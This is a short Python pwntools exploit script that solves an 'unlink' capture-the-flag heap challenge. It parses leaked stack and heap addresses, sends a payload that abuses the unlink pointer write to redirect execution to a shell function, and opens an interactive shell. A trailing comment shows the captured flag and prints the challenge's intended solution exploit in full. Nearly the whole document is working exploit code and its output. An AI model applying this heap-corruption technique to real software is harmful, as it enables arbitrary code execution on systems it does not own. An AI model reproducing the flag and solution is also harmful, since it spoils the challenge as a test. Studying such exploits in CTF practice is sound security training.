from pwn import *

p = process("./unlink")

shell_addr = 0x080484eb

p.recvuntil("leak: 0x")
stack_addr = int(p.recvuntil("\n", drop=True), 16)

p.recvuntil("leak: 0x")
heap_addr = int(p.recvuntil("\n", drop=True), 16)

p.sendlineafter("shell!\n", p32(shell_addr) + "A"*12 + p32(heap_addr + 0xc) + p32(stack_addr + 0x10))

p.interactive()


'''
$ ls
flag  intended_solution.txt  unlink  unlink.c
$ cat flag
conditional_write_what_where_from_unl1nk_explo1t
$ cat int
cat: int: No such file or directory
$ cat int*
from pwn import *
context.arch = 'i386'    # i386 / arm
r = process(['/home/unlink/unlink'])
leak = r.recvuntil('shell!\n')
stack = int(leak.split('leak: 0x')[1][:8], 16)
heap = int(leak.split('leak: 0x')[2][:8], 16)
shell = 0x80484eb
payload = pack(shell)        # heap + 8  (new ret addr)
payload += pack(heap + 12)    # heap + 12 (this -4 becomes ESP at ret)
payload += '3333'        # heap + 16
payload += '4444'
payload += pack(stack - 0x20)    # eax. (address of old ebp of unlink) -4
payload += pack(heap + 16)    # edx.
r.sendline( payload )
r.interactive()

$ exit
'''